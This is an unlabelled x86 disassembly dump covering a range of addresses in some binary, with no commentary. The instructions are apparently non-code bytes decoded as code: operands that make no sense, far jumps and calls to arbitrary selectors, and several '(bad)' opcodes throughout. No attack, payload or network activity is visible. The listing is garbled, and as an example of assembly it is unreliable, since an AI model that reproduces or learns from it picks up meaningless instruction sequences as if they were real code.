  4036c1:	add    DWORD PTR [eax-0x5e7e0000],esp
  4036c7:	adc    BYTE PTR [eax+0x42],al
  4036ca:	mov    ds:0x10305290,al
  4036cf:	or     al,BYTE PTR [eax*1+0x1aa20a60]
  4036d6:	or     al,BYTE PTR [ecx]
  4036d8:	push   edx
  4036d9:	or     DWORD PTR [edx],eax
  4036db:	inc    eax
  4036dc:	mov    bh,0x42
  4036de:	sub    BYTE PTR [esp+eiz*2+0x14a0a4b1],dl
  4036e5:	add    ah,cl
  4036e7:	add    esp,DWORD PTR [eax]
  4036e9:	add    BYTE PTR [ebx],ah
  4036eb:	sub    DWORD PTR [ecx],ecx
  4036ed:	add    eax,esp
  4036ef:	add    DWORD PTR [ecx+0x4f18001],ecx
  4036f5:	xchg   ecx,eax
  4036f6:	adc    al,BYTE PTR ds:0x4200089
  4036fc:	xor    BYTE PTR [eax+0x0],al
  4036ff:	xor    BYTE PTR [eax],al
  403701:	pop    esi
  403702:	push   eax
  403703:	push   ss
  403704:	dec    edx
  403705:	add    BYTE PTR [esi],al
  403707:	mov    eax,ds:0x224c41e0
  40370c:	push   eax
  40370d:	or     BYTE PTR [eax],0xa
  403710:	sub    al,0x4
  403712:	add    edx,esp
  403714:	add    DWORD PTR [eax+eax*1],eax
  403717:	add    BYTE PTR [ecx],0x21
  40371a:	add    BYTE PTR [eax+0xe204301],ah
  403720:	and    BYTE PTR [eax],dl
  403722:	add    cl,al
  403724:	inc    edx
  403725:	sub    BYTE PTR [eax],cl
  403727:	inc    eax
  403728:	call   DWORD PTR ds:0x437114
  40372e:	adc    al,0x0
  403730:	dec    ecx
  403731:	and    dh,cl
  403733:	mov    al,ds:0x182081
  403738:	add    al,0x40
  40373a:	xchg   edx,eax
  40373b:	add    dl,BYTE PTR [eax]
  40373d:	fstp   DWORD PTR [edx+0x20]
  403740:	inc    eax
  403741:	dec    ecx
  403742:	ret    0x980
  403745:	add    esp,esp
  403747:	adc    BYTE PTR [ecx],al
  403749:	adc    BYTE PTR [eax+0x24],bl
  40374c:	adc    DWORD PTR [ecx],ecx
  40374e:	loopne 0x40375d
  403750:	add    cl,BYTE PTR [ecx+eiz*1]
  403753:	and    al,0x20
  403755:	adc    al,0x2c
  403757:	mov    eax,ds:0x13a18008
  40375c:	and    BYTE PTR [edx+eax*2],dl
  40375f:	add    dl,BYTE PTR [eax]
  403761:	sub    al,0x80
  403763:	or     BYTE PTR [ecx],al
  403765:	pusha  
  403766:	add    BYTE PTR [esi],al
  403768:	add    BYTE PTR [edi+eax*1],al
  40376b:	add    al,0x60
  40376d:	and    BYTE PTR [ecx+0x40030262],al
  403773:	add    DWORD PTR [eax],0x44008c2
  403779:	mov    ah,0x11
  40377b:	and    DWORD PTR ds:0x50089409,eax
  403781:	and    BYTE PTR [eax-0x80],al
  403784:	mov    al,0x80
  403786:	and    al,BYTE PTR [ecx-0x7ffad700]
  40378c:	adc    BYTE PTR [eax+0x0],al
  40378f:	and    DWORD PTR [eax-0x7f],ecx
  403792:	and    BYTE PTR [ecx-0x7ddae7f7],cl
  403798:	push   es
  403799:	adc    BYTE PTR [eax],al
  40379b:	add    BYTE PTR [edx+0x15],bl
  40379e:	add    BYTE PTR [esi+eax*1+0x11],al
  4037a2:	mov    al,ds:0xce5a288
  4037a7:	inc    ecx
  4037a8:	push   ss
  4037a9:	call   0x19d0:0x2c04c880
  4037b0:	mov    BYTE PTR [ebx],bl
  4037b2:	mov    esp,0x2201280a
  4037b7:	add    BYTE PTR [eax],dh
  4037b9:	add    BYTE PTR [bx+di-0x6f],al
  4037bd:	inc    esp
  4037be:	add    dl,dl
  4037c0:	or     edx,DWORD PTR [esp+ecx*1+0x0]
  4037c4:	jle    0x403748
  4037c6:	mov    BYTE PTR [eax+eiz*2],ah
  4037c9:	adc    eax,0x20282148
  4037ce:	or     dl,BYTE PTR [esi-0x45ed7d55]
  4037d4:	add    DWORD PTR [esp+eax*2-0x57],ecx
  4037d8:	or     al,dl
  4037da:	and    DWORD PTR [eax],eax
  4037dc:	shl    BYTE PTR [edx+ebp*1],0xa
  4037e0:	test   DWORD PTR [esi+0x40998000],eax
  4037e6:	or     BYTE PTR [ebx-0x76ff37e0],al
  4037ec:	push   ss
  4037ed:	test   BYTE PTR [ebx],0x80
  4037f0:	bound  ecx,QWORD PTR [eax+ecx*2]
  4037f3:	add    esi,DWORD PTR [edx+0x14811a1b]
  4037f9:	push   esi
  4037fa:	sub    al,0x0
  4037fc:	adc    BYTE PTR [eax],ah
  4037fe:	adc    BYTE PTR [eax+0x21450820],al
  403804:	add    BYTE PTR [edx],ah
  403806:	pop    es
  403807:	add    ch,al
  403809:	add    dl,BYTE PTR [ebp+0x2c]
  40380c:	inc    eax
  40380d:	add    bl,0x44
  403810:	inc    ecx
  403811:	cmp    al,0x21
  403813:	and    ah,BYTE PTR [ebx]
  403815:	dec    eax
  403816:	or     BYTE PTR [eax],0x39
  403819:	add    BYTE PTR [edx],0x44
  40381c:	dec    eax
  40381d:	inc    esp
  40381e:	push   es
  40381f:	sub    bl,cl
  403821:	mov    WORD PTR [eax+0x12],es
  403824:	and    BYTE PTR [eax+0x4b],al
  403827:	dec    eax
  403828:	inc    eax
  403829:	push   esp
  40382a:	push   cs
  40382b:	or     al,0x3
  40382d:	or     BYTE PTR [edx+0x6],al
  403830:	inc    eax
  403831:	enter  0x1109,0xb8
  403835:	pop    edx
  403836:	add    DWORD PTR [eax+0x44],0x2c05a19
  40383d:	sub    BYTE PTR [eax],al
  40383f:	and    al,0x70
  403841:	adc    edx,DWORD PTR [eax+0x24]
  403844:	xor    BYTE PTR [esi],al
  403846:	and    al,0x4
  403848:	adc    al,dl
  40384a:	iret   
  40384b:	or     ah,BYTE PTR [eax-0x6e]
  40384e:	and    eax,0xba122249
  403853:	xor    DWORD PTR [ecx+0x4801201],esp
  403859:	dec    eax
  40385a:	xchg   edx,eax
  40385b:	xchg   esi,eax
  40385c:	add    BYTE PTR [eax-0x7c],dl
  40385f:	add    BYTE PTR [ecx],ah
  403861:	or     al,0x15
  403864:	xchg   DWORD PTR [eax+edx*2],eax
  403867:	xchg   BYTE PTR [eax],al
  403869:	add    DWORD PTR [eax],edx
  40386b:	add    BYTE PTR [eax-0x57],al
  40386e:	dec    esp
  40386f:	inc    eax
  403870:	jecxz  0x403882
  403872:	shl    bl,0x52
  403875:	add    al,0x2
  403877:	pop    edx
  403878:	xchg   BYTE PTR [esi+0x420c1f14],dl
  40387e:	je     0x40388a
  403880:	ror    BYTE PTR [eax+0x301244],0x4
  403887:	or     cl,BYTE PTR [ecx]
  403889:	push   es
  40388a:	retf   
  40388b:	add    BYTE PTR [edx],ah
  40388d:	rcl    BYTE PTR [eax+ecx*1],cl
  403890:	add    edx,DWORD PTR [eax+0x40]
  403893:	and    BYTE PTR [eax],al
  403895:	mov    BYTE PTR [edx+0x32a8c428],dl
  40389b:	and    BYTE PTR [ecx],0x10
  40389e:	add    BYTE PTR [eax],al
  4038a0:	add    BYTE PTR [eax],0x1
  4038a3:	adc    al,0x52
  4038a5:	pop    es
  4038a6:	add    cl,BYTE PTR [eax]
  4038a8:	ror    BYTE PTR [ecx],0x0
  4038ab:	push   eax
  4038ac:	add    BYTE PTR [ecx+0x32],al
  4038af:	inc    eax
  4038b0:	pop    ebx
  4038b1:	rol    BYTE PTR [ecx],0x0
  4038b4:	add    al,BYTE PTR [eax+0x20]
  4038b7:	add    dl,BYTE PTR [eax]
  4038b9:	adc    BYTE PTR [esi+edi*1+0x4],dh
  4038bd:	add    DWORD PTR [eax],ecx
  4038bf:	and    al,BYTE PTR [eax]
  4038c1:	or     BYTE PTR [eax],dl
  4038c3:	mov    al,ds:0x18520802
  4038c8:	sub    BYTE PTR [ecx],0x20
  4038cb:	add    al,0x0
  4038cd:	jo     0x403859
  4038cf:	imul   eax,DWORD PTR [edx-0x75feb3a0],0xf0091824
  4038d9:	nop
  4038da:	adc    BYTE PTR [esi],dl
  4038dc:	stos   BYTE PTR es:[edi],al
  4038dd:	adc    BYTE PTR [esi+eiz*4+0x8c32088],ah
  4038e4:	enter  0x8824,0x4f
  4038e8:	jb     0x4038eb
  4038ea:	or     eax,DWORD PTR [esi]
  4038ec:	or     BYTE PTR [ebp+eiz*8+0x430aa002],dh
  4038f3:	add    DWORD PTR [edx],eax
  4038f5:	or     al,BYTE PTR [edx+0x2]
  4038f8:	rol    ah,1
  4038fa:	add    BYTE PTR [eax],dh
  4038fc:	and    BYTE PTR [esi],cl
  4038fe:	pop    edx
  4038ff:	inc    esp
  403900:	add    BYTE PTR [eax],al
  403902:	push   0x89000b00
  403907:	add    DWORD PTR [eax-0x2e],edx
  40390a:	rcl    BYTE PTR [ecx],1
  40390c:	add    BYTE PTR [edi+edx*1+0x2100940],ah
  403913:	add    DWORD PTR [ecx-0x7f],0x1e0819e8
  40391a:	int3   
  40391b:	add    BYTE PTR [edx+0xe44400c],al
  403921:	popa   
  403922:	pop    es
  403923:	add    DWORD PTR [ebp+eax*1+0x15240c00],esp
  40392a:	or     al,0x8a
  40392c:	and    DWORD PTR [eax+0x161e1213],esi
  403932:	pusha  
  403933:	adc    ah,BYTE PTR [ebx+eax*2+0x21]
  403937:	lock jmp 0xa801:0x240010c0
  40393f:	add    BYTE PTR [eax],al
  403941:	and    DWORD PTR [ecx+0x20121017],0x2
  403948:	add    BYTE PTR [edx+eiz*1+0x50],dh
  40394c:	or     eax,0x9420a312
  403951:	add    al,0x0
  403953:	or     DWORD PTR [eax+0x10280222],edx
  403959:	mov    cs,WORD PTR [eax]
  40395b:	push   ebx
  40395c:	inc    esp
  40395d:	add    BYTE PTR ds:0x209200c0,ch
  403963:	add    al,0x86
  403965:	add    esp,DWORD PTR [eax+eiz*1]
  403968:	adc    DWORD PTR [ecx],eax
  40396a:	add    al,0xa
  40396c:	dec    eax
  40396d:	sbb    dl,cl
  40396f:	adc    bl,BYTE PTR [eax]
  403971:	add    al,0x0
  403973:	add    BYTE PTR [edx+0x20120e4],al
  403979:	xchg   BYTE PTR [edx],dl
  40397b:	mov    eax,cs:0x980a1022
  403981:	add    al,0x70
  403983:	add    al,0xc9
  403985:	and    BYTE PTR fs:[ecx],al
  403988:	and    BYTE PTR [eax+ebx*2],0xc
  40398c:	inc    ecx
  40398d:	add    ah,BYTE PTR [ebp+eax*2+0x1405820]
  403994:	add    BYTE PTR ds:0x40401208,dl
  40399a:	and    DWORD PTR [eax+0x0],esi
  40399d:	sbb    dl,cl
  40399f:	add    DWORD PTR [ecx+esi*4],ebp
  4039a2:	mov    ecx,0xa0080a05
  4039a7:	jecxz  0x4039b1
  4039a9:	mov    al,ds:0x320e2432
  4039ae:	mov    edx,DWORD PTR [ecx+eiz*2-0x175b3bbf]
  4039b5:	add    BYTE PTR [eax+0x4],0xcb
  4039b9:	inc    eax
  4039ba:	dec    eax
  4039bb:	or     al,0xd4
  4039bd:	sub    BYTE PTR [edx+0x34],ch
  4039c0:	adc    BYTE PTR [eax],cl
  4039c2:	or     DWORD PTR [ecx],ecx
  4039c4:	pop    esp
  4039c5:	adc    BYTE PTR [eax],dl
  4039c7:	add    DWORD PTR [eax],eax
  4039c9:	ficom  DWORD PTR [edx+eiz*4]
  4039cc:	add    DWORD PTR [eax+0x4010a97],edx
  4039d2:	adc    BYTE PTR [esi-0x7ff5bf7e],cl
  4039d8:	add    DWORD PTR [ecx],0x63010b
  4039de:	test   BYTE PTR [eax],cl
  4039e0:	add    BYTE PTR [edx],dl
  4039e2:	and    DWORD PTR [eax],eax
  4039e4:	mov    DWORD PTR [esi+0x2228a155],edx
  4039ea:	fmul   DWORD PTR [esi]
  4039ec:	add    BYTE PTR [eax+0x20],ah
  4039ef:	or     al,0x0
  4039f1:	and    DWORD PTR [edx],eax
  4039f3:	and    DWORD PTR ds:0xe8899200,edx
  4039f9:	add    BYTE PTR [eax+0x46],al
  4039fc:	xor    al,0x1
  4039fe:	add    al,0x22
  403a00:	sub    DWORD PTR [eax],0x70400028
  403a06:	and    DWORD PTR [edi+esi*1-0x7777bff3],eax
  403a0d:	popa   
  403a0e:	xchg   esp,eax
  403a0f:	inc    edi
  403a10:	adc    BYTE PTR [eax],0x70
  403a13:	add    al,BYTE PTR [edx-0x37ee532e]
  403a19:	mov    DWORD PTR [eax+0x20],eax
  403a1c:	test   BYTE PTR [eax+0x1],bl
  403a1f:	add    BYTE PTR [edx],al
  403a21:	or     BYTE PTR [edx],ah
  403a23:	test   DWORD PTR [eax],ecx
  403a25:	add    dl,BYTE PTR [eax+ebp*4]
  403a28:	xor    BYTE PTR [edx+0x0],al
  403a2b:	add    BYTE PTR [eax+0x4a236c],bh
  403a31:	test   BYTE PTR [eax],ah
  403a33:	inc    eax
  403a34:	mov    DWORD PTR [ecx],eax
  403a36:	pusha  
  403a37:	add    BYTE PTR [eax+edx*8],al
  403a3a:	adc    BYTE PTR [eax],al
  403a3c:	add    BYTE PTR ds:0xda300288,al
  403a42:	push   es
  403a43:	pusha  
  403a44:	mov    ds:0x260e0660,al
  403a49:	add    DWORD PTR [edx+0x48],eax
  403a4c:	add    BYTE PTR [ebx],cl
  403a4e:	sbb    BYTE PTR [ebx+0x1f2a014],al
  403a54:	adc    BYTE PTR [edx+eax*2+0x14041a62],dl
  403a5b:	sbb    al,0x22
  403a5d:	and    DWORD PTR [eax-0x7e],eax
  403a60:	add    DWORD PTR [eax],eax
  403a62:	cmp    BYTE PTR ds:0x3b6194ca,cl
  403a68:	add    BYTE PTR [eax],al
  403a6a:	add    al,BYTE PTR [ebp+0x30802c3]
  403a70:	test   DWORD PTR [ecx+ecx*4],ecx
  403a73:	and    al,cl
  403a75:	add    BYTE PTR [esi-0x337ffb7e],dl
  403a7b:	cmp    al,0x30
  403a7d:	int3   
  403a7e:	mov    DWORD PTR [edx],ecx
  403a80:	adc    DWORD PTR [ecx+0x54349982],eax
  403a86:	xchg   ebp,eax
  403a87:	and    BYTE PTR [eax],al
  403a89:	and    BYTE PTR [eax-0x15eb3800],0x0
  403a90:	push   ds
  403a91:	add    eax,DWORD PTR [ecx+0x26242092]
  403a97:	ror    BYTE PTR [eax],0x2
  403a9a:	mov    BYTE PTR [edx],dl
  403a9c:	adc    ebp,DWORD PTR [eax]
  403a9e:	cwde   
  403a9f:	daa    
  403aa0:	add    BYTE PTR ss:[ebx],al
  403aa3:	inc    edx
  403aa4:	add    eax,0x88c11018
  403aa9:	xchg   ecx,eax
  403aaa:	adc    BYTE PTR [esi-0x3f9f6fc0],bl
  403ab0:	xor    eax,esp
  403ab2:	and    DWORD PTR [eax+eax*1],edx
  403ab5:	nop
  403ab6:	add    BYTE PTR [eax],dl
  403ab8:	push   ds
  403ab9:	rol    DWORD PTR [ecx],1
  403abb:	mov    dl,0x8
  403abd:	add    ecx,DWORD PTR [eax]
  403abf:	adc    al,0x5
  403ac1:	sbb    DWORD PTR [ecx],eax
  403ac3:	add    dl,BYTE PTR [ebx+0x42]
  403ac6:	push   edx
  403ac7:	mov    BYTE PTR [edx],dl
  403ac9:	mov    eax,ds:0x10a22817
  403ace:	ret    
  403acf:	add    DWORD PTR [eax],0x10c40014
  403ad5:	adc    al,0x84
  403ad7:	pushf  
  403ad8:	lods   eax,DWORD PTR ds:[esi]
  403ad9:	retf   
  403ada:	or     BYTE PTR [eax],0x3
  403add:	inc    eax
  403ade:	inc    ebp
  403adf:	and    al,BYTE PTR [eax+eax*1]
  403ae2:	mov    al,ds:0x832211c
  403ae7:	pusha  
  403ae8:	sub    al,BYTE PTR [eax+0x5]
  403aeb:	add    BYTE PTR [eax+0x402e07],0xa
  403af2:	push   ss
  403af3:	mov    esi,0xc000110e
  403af8:	add    ah,BYTE PTR ds:0x5271030a
  403afe:	inc    ecx
  403aff:	add    BYTE PTR [eax+0x4],ah
  403b02:	loopne 0x403b2c
  403b04:	add    BYTE PTR [eax+eiz*1],al
  403b07:	and    al,0x24
  403b09:	or     DWORD PTR [ecx+eax*1+0x22181408],eax
  403b10:	add    BYTE PTR [esi],ah
  403b12:	mov    BYTE PTR [ecx],al
  403b14:	adc    bl,bh
  403b16:	and    BYTE PTR [edx+0x38010402],dl
  403b1c:	and    BYTE PTR [ecx+eax*1],ah
  403b1f:	or     BYTE PTR [esi],0x1
  403b22:	adc    ah,BYTE PTR [edx-0xdbf14d4]
  403b28:	xor    DWORD PTR [eax],eax
  403b2a:	test   BYTE PTR [ecx-0x5e],ch
  403b2d:	add    BYTE PTR [eax-0x40],al
  403b30:	pusha  
  403b31:	or     BYTE PTR [edx],al
  403b33:	pusha  
  403b34:	xchg   edx,eax
  403b35:	shl    BYTE PTR [edx],0x40
  403b38:	dec    eax
  403b39:	xor    DWORD PTR [edx-0x3e],esp
  403b3c:	or     DWORD PTR ds:0x85483048,ecx
  403b42:	rol    BYTE PTR [eax+edi*1+0x22],1
  403b46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b47:	adc    al,0x2
  403b49:	inc    edx
  403b4a:	add    al,ah
  403b4c:	aam    0x0
  403b4e:	test   BYTE PTR [eax+eax*1+0x21],al
  403b52:	adc    bh,BYTE PTR [esi]
  403b54:	inc    eax
  403b55:	add    BYTE PTR [ebx-0x5ff63d00],dl
  403b5b:	add    DWORD PTR [eax+0x42624],eax
  403b61:	push   ss
  403b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b63:	add    al,BYTE PTR [edx+0x10]
  403b66:	sub    BYTE PTR [ecx+eax*1+0x52],ch
  403b6a:	repnz push esp
  403b6c:	and    BYTE PTR [ecx+0x1114450],al
  403b72:	add    DWORD PTR [ecx],eax
  403b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b75:	and    al,BYTE PTR [eax+0x28]
  403b78:	adc    BYTE PTR [eax],0x20
  403b7b:	and    BYTE PTR [eax],al
  403b7d:	add    DWORD PTR [eax+0x54],ecx
  403b80:	or     al,0x1
  403b82:	nop
  403b83:	and    BYTE PTR [edx+edx*4+0xd280510],al
  403b8a:	and    DWORD PTR es:[eax+0x44],ecx
  403b8e:	inc    eax
  403b8f:	adc    DWORD PTR [eax],esi
  403b91:	inc    esp
  403b92:	sub    BYTE PTR [eax+0x4a422000],ch
  403b98:	mov    BYTE PTR [eax],cl
  403b9a:	or     cl,BYTE PTR [eax+0x28]
  403b9d:	dec    eax
  403b9e:	and    BYTE PTR [edi],dl
  403ba0:	ss ret 0x316c
  403ba4:	dec    edx
  403ba5:	dec    edx
  403ba6:	push   edx
  403ba7:	add    DWORD PTR [edx+0x20],eax
  403baa:	and    BYTE PTR [esi+0x4143],0x0
  403bb1:	inc    esp
  403bb2:	xchg   DWORD PTR [edx],ecx
  403bb4:	add    BYTE PTR [eax+0x24],al
  403bb7:	sbb    BYTE PTR [eax+eax*1+0x12],dl
  403bbb:	test   BYTE PTR [edx-0x352dd7ce],ch
  403bc1:	or     dl,BYTE PTR [eax+0x2]
  403bc4:	add    BYTE PTR [ecx+0x4],cl
  403bc7:	and    al,0xc1
  403bc9:	adc    cl,BYTE PTR [ebx-0x74]
  403bcc:	xor    BYTE PTR [ecx+ecx*1+0x42],al
  403bd0:	nop
  403bd1:	add    BYTE PTR [edx+edx*1],al
  403bd4:	push   eax
  403bd5:	adc    eax,0x86000008
  403bda:	rcl    BYTE PTR [edx],0x10
  403bdd:	adc    DWORD PTR [eax-0x7f],eax
  403be0:	or     DWORD PTR [eax],edx
  403be2:	add    dh,BYTE PTR [ecx]
  403be4:	xor    eax,DWORD PTR [edx]
  403be6:	dec    ecx
  403be7:	inc    eax
  403be8:	add    al,BYTE PTR [eax]
  403bea:	add    BYTE PTR [ecx+0x30104048],cl
  403bf0:	or     BYTE PTR [eax+0x40010240],ah
  403bf6:	add    al,0xa2
  403bf8:	and    cl,BYTE PTR [edx+0x8]
  403bfb:	and    al,BYTE PTR [edx+0x882c80]
  403c01:	add    al,0x3
  403c03:	lods   al,BYTE PTR ds:[esi]
  403c04:	daa    
  403c05:	and    DWORD PTR [eax],ecx
  403c07:	add    dl,BYTE PTR [ecx]
  403c09:	add    BYTE PTR [eax],bl
  403c0b:	pushf  
  403c0c:	add    cl,bh
  403c0e:	inc    ecx
  403c0f:	(bad)  
  403c10:	daa    
  403c11:	add    bl,BYTE PTR [ebx+0xc0404e8]
  403c17:	inc    ebp
  403c18:	add    BYTE PTR [eax],ah
  403c1a:	or     BYTE PTR [eax],bl
  403c1c:	lock mov al,ds:0xc0001be8
  403c22:	or     DWORD PTR [ecx-0x7f],ecx
  403c25:	add    al,BYTE PTR [esi]
  403c27:	push   ecx
  403c28:	mov    BYTE PTR [ebp+0x50410480],ah
  403c2e:	sub    BYTE PTR [eax],al
  403c30:	mov    ds:0x18941309,al
  403c35:	adc    al,0x2
  403c37:	loope  0x403bc1
  403c39:	inc    ecx
  403c3a:	es mov al,0x4b
  403c3d:	mov    al,BYTE PTR [eax]
  403c3f:	push   es
  403c40:	add    BYTE PTR [edx],al
  403c42:	sbb    dh,BYTE PTR [eax+0x0]
  403c45:	sbb    DWORD PTR [eax+ecx*4+0x12608084],0x44
  403c4d:	add    ecx,DWORD PTR [ecx]
  403c4f:	push   0xa08aa090
  403c54:	adc    BYTE PTR [ebp+0x1],ah
  403c57:	add    ebp,DWORD PTR [esi]
  403c59:	or     DWORD PTR [ecx],0xffffff81
  403c5c:	lds    ebx,FWORD PTR [eax]
  403c5e:	push   edx
  403c5f:	or     BYTE PTR [eax-0x7e],al
  403c62:	add    BYTE PTR [eax],al
  403c64:	or     BYTE PTR [eax],dh
  403c66:	fadd   st,st(4)
  403c68:	sbb    al,0x0
  403c6a:	adc    al,BYTE PTR [edx]
  403c6c:	inc    edx
  403c6d:	add    DWORD PTR [eax],eax
  403c6f:	add    BYTE PTR [edx],al
  403c71:	lods   eax,DWORD PTR ds:[esi]
  403c72:	mov    eax,ds:0x90d0286
  403c77:	add    al,0xc1
  403c79:	rol    DWORD PTR [eax+eax*2],0xc
  403c7d:	inc    esp
  403c7e:	popf   
  403c7f:	repz add BYTE PTR [eax+eax*2+0x2c812263],cl
  403c87:	aas    
  403c88:	dec    eax
  403c89:	add    ebx,DWORD PTR [eax]
  403c8b:	or     BYTE PTR [ebx+eax*1],al
  403c8e:	cmp    BYTE PTR [eax+eax*2],dl
  403c91:	inc    ecx
  403c92:	xor    BYTE PTR [ecx+ebx*4],al
  403c95:	test   BYTE PTR [ebp+0x4],al
  403c98:	dec    edx
  403c99:	push   es
  403c9a:	add    eax,0x10700208
  403c9f:	add    eax,DWORD PTR [eax+edi*1]
  403ca2:	imul   eax,DWORD PTR [ecx],0x4246c000
  403ca8:	add    al,BYTE PTR [edi]
  403caa:	inc    ecx
  403cab:	push   edx
  403cac:	adc    edx,DWORD PTR [ecx+0x3]
  403caf:	inc    esp
  403cb0:	add    al,BYTE PTR [edx]
  403cb2:	add    al,0xa8
  403cb4:	or     eax,0x7110f090
  403cb9:	and    al,0x2c
  403cbb:	add    BYTE PTR [eax],0x13
  403cbe:	bound  esp,QWORD PTR [eax]
  403cc0:	dec    eax
  403cc1:	or     al,0x15
  403cc3:	adc    DWORD PTR [eax],0x54042a4a
  403cc9:	daa    
  403cca:	or     BYTE PTR [edx],cl
  403ccc:	mov    BYTE PTR [eax+ecx*2],al
  403ccf:	or     DWORD PTR [eax],eax
  403cd1:	mov    BYTE PTR [eax+0x58c7d051],ah
  403cd7:	mov    dl,0x89
  403cd9:	xor    al,BYTE PTR [eax]
  403cdb:	(bad)  
  403cdc:	add    al,0x87
  403cde:	nop
  403cdf:	inc    esp
  403ce0:	inc    esp
  403ce1:	pusha  
  403ce2:	pusha  
  403ce3:	inc    edx
  403ce4:	and    BYTE PTR [ebx],al
  403ce6:	adc    DWORD PTR [edx],ecx
  403ce8:	or     BYTE PTR [edx*1+0x4041408],al
  403cef:	add    BYTE PTR [edx],al
  403cf1:	inc    eax
  403cf2:	and    eax,0x10808002
  403cf7:	pusha  
  403cf8:	add    DWORD PTR [ecx],0x27210000
  403cfe:	sbb    BYTE PTR [eax],dl
  403d00:	popa   
  403d01:	add    edx,esp
  403d03:	nop
  403d04:	or     DWORD PTR [ebx-0x1a],eax
  403d07:	or     BYTE PTR [eax],al
  403d09:	xchg   ecx,eax
  403d0a:	add    BYTE PTR ds:0x2b140309,bh
  403d10:	xor    DWORD PTR [edx],eax
  403d12:	pushf  
  403d13:	ror    BYTE PTR [edx+0x1a],0x60
  403d17:	or     al,0x0
  403d19:	sub    al,0x0
  403d1b:	add    ah,ah
  403d1d:	and    BYTE PTR [eax+eiz*1-0x37f7de2d],al
  403d24:	add    al,0x54
  403d26:	add    BYTE PTR [edx+0x41],cl
  403d29:	add    eax,0x22088008
  403d2e:	add    al,0x10
  403d30:	add    edi,DWORD PTR [ecx]
  403d32:	or     al,0x10
  403d34:	and    ch,BYTE PTR [esp]
  403d37:	ret    0x1c0
  403d3a:	ror    BYTE PTR [eax],1
  403d3c:	add    BYTE PTR [ecx],al
  403d3e:	sub    BYTE PTR [edx],ah
  403d40:	add    dh,BYTE PTR [eax+0x20]
  403d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d44:	or     al,BYTE PTR [edx]
  403d46:	add    DWORD PTR [eax],esp
  403d48:	dec    edx
  403d49:	sbb    BYTE PTR [eax-0x6bff7c9d],al
  403d4f:	add    BYTE PTR [eax+0x5a],bh
  403d52:	add    ah,BYTE PTR [eax+0x7a204108]
  403d58:	add    al,0x4e
  403d5a:	or     bh,BYTE PTR [eax]
  403d5c:	sbb    bl,BYTE PTR [ecx+0x2011a309]
  403d62:	jmp    0x403d64
  403d64:	adc    BYTE PTR [ecx+0x0],ah
  403d67:	add    BYTE PTR [edx+0x58],al
  403d6a:	ret    0x100
  403d6d:	push   ecx
  403d6e:	add    al,BYTE PTR [eax+0x382120b8]
  403d74:	xchg   edx,eax
  403d75:	add    BYTE PTR [ebp-0x2b6bfff8],al
  403d7b:	add    BYTE PTR [eax],ah
  403d7d:	adc    ah,BYTE PTR [eax+0x29]
  403d80:	mov    al,0x22
  403d82:	add    BYTE PTR [edx-0x7e],cl
  403d85:	add    BYTE PTR [eax],al
  403d87:	or     al,BYTE PTR [edx]
  403d89:	inc    eax
  403d8a:	add    al,0x2d
  403d8c:	push   eax
  403d8d:	inc    eax
  403d8e:	add    BYTE PTR [edx],cl
  403d90:	push   eax
  403d91:	or     BYTE PTR [ebx+0x80d061],0x6
  403d98:	rol    BYTE PTR [edx+eax*1+0x4a881810],0x4a
  403da0:	pop    es
  403da1:	adc    al,BYTE PTR [eax]
  403da3:	leave  
  403da4:	add    ebp,DWORD PTR [eax]
  403da6:	xchg   ecx,eax
  403da7:	and    BYTE PTR [edx],0x82
  403daa:	or     al,0x10
  403dac:	mov    al,ds:0x852c0052
  403db1:	push   0x300b1191
  403db6:	test   DWORD PTR [ebp-0x3e],esp
  403db9:	add    BYTE PTR [eax],al
  403dbb:	push   edx
  403dbc:	jo     0x403dbe
  403dbe:	push   esi
  403dbf:	push   esp
  403dc0:	adc    DWORD PTR [ebx+0x8],ebx
  403dc3:	and    esp,0x8000816
  403dc9:	push   eax
  403dca:	add    BYTE PTR [ecx+0x55800104],al
  403dd0:	or     BYTE PTR [ecx],dh
  403dd2:	mov    DWORD PTR [ecx],eax
  403dd4:	mov    al,BYTE PTR [eax]
  403dd6:	ror    BYTE PTR [esp+edi*1+0x0],0xa
  403ddb:	add    BYTE PTR [ecx+0xc],cl
  403dde:	add    BYTE PTR [edx],al
  403de0:	push   ecx
  403de1:	add    bl,BYTE PTR [eax+0x12102888]
  403de7:	retf   0x1823
  403dea:	add    dh,BYTE PTR [edx-0x7b]
  403ded:	inc    esp
  403dee:	mov    al,0x61
  403df0:	dec    ebp
  403df1:	sbb    BYTE PTR [esi+0x77],al
  403df4:	inc    esp
  403df5:	add    BYTE PTR [edx],al
  403df7:	add    al,BYTE PTR ds:0x2040050
  403dfd:	add    BYTE PTR [eax],cl
  403dff:	or     dl,BYTE PTR [eax+0x40]
  403e02:	or     al,0x1
  403e04:	xchg   esp,eax
  403e05:	sub    BYTE PTR [ecx],0xe0
  403e08:	pop    es
  403e09:	inc    ecx
  403e0a:	loope  0x403e1f
  403e0c:	add    BYTE PTR [ebx],al
  403e0e:	add    DWORD PTR [eax+eax*1],eax
  403e11:	dec    eax
  403e12:	nop
  403e13:	add    dl,BYTE PTR [edx+0x5]
  403e16:	sbb    BYTE PTR [eax+0x4],al
  403e19:	add    al,0x2
  403e1b:	and    BYTE PTR [eax+0x1e],al
  403e1e:	or     BYTE PTR [ecx],dl
  403e20:	adc    al,0x60
  403e22:	push   cs
  403e23:	or     al,0x5
  403e25:	push   ecx
  403e26:	inc    ebx
  403e27:	inc    esp
  403e28:	cmp    eax,0x45513084
  403e2d:	or     BYTE PTR [ebp-0x62],dl
  403e30:	or     BYTE PTR [eax+0xb10e00c],0x5
  403e37:	or     BYTE PTR [esi],cl
  403e39:	sub    BYTE PTR [eax],al
  403e3b:	push   cs
  403e3c:	add    DWORD PTR [ecx+ecx*4],eax
  403e3f:	add    BYTE PTR [edx+eax*1],bl
  403e42:	rol    BYTE PTR [ecx+0x10da8000],0x3
  403e49:	cmp    al,0x28
  403e4b:	dec    ecx
  403e4c:	nop
  403e4d:	inc    eax
  403e4e:	test   cl,cl
  403e50:	push   eax
  403e51:	add    BYTE PTR [edx],dl
  403e53:	push   es
  403e54:	ror    BYTE PTR [ecx],1
  403e56:	or     BYTE PTR [eax],al
  403e58:	mov    dl,0x24
  403e5a:	mov    cl,0x0
  403e5c:	add    DWORD PTR [ecx],edx
  403e5e:	or     al,BYTE PTR [eax+0x49d9106]
  403e64:	add    BYTE PTR [eax],ah
